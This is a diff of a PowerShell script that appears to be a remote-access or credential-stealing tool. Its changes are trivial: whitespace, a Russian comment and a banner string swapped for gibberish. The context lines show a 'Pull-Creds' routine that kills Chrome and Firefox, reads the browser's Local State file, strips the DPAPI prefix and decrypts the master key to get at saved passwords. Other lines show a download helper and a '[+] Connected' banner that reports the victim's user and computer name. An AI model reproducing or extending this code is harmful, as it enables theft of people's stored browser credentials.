@@ -388,7 +388,7 @@ function PortSuggest {
         return "[DOWNLOADED] $out"
     }
 
-    function Pull-Creds {
+   function Pull-Creds {
     try {
         Stop-Process -Name "chrome" -Force -ErrorAction SilentlyContinue
         Stop-Process -Name "firefox" -Force -ErrorAction SilentlyContinue
@@ -406,7 +406,7 @@ function PortSuggest {
             $json = Get-Content $localStatePath -Raw | ConvertFrom-Json
             $encKeyB64 = $json.os_crypt.encrypted_key
             $encKey = [Convert]::FromBase64String($encKeyB64)
-            $encKey = $encKey[5..($encKey.Length - 1)]
+            $encKey = $encKey[5..($encKey.Length - 1)]  # Убираем DPAPI префикс
 
             Add-Type -AssemblyName System.Security
             $aesKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encKey, $null, 'CurrentUser')
@@ -476,6 +476,7 @@ function PortSuggest {
         return $err
     }
 }
+
 
 
 
@@ -694,7 +695,7 @@ ________  ___  ________  ________      ________  ________
     /  /_/__\ \  \ \  \___|\ \  \\\  \ __\ \  \|\  \ \  \_\\ \ 
    |\________\ \__\ \__\    \ \_______\\__\ \_______\ \_______\
     \|_______|\|__|\|__|     \|_______\|__|\|_______|\|_______|  
-                                           yeah                                                                                                                                                                   
+                                           egwehwehwegewfef33                                                                                                                                                                   
 ${esc}[0m
 
 ${esc}[32m[+] Connected :: $env:USERNAME@$env:COMPUTERNAME
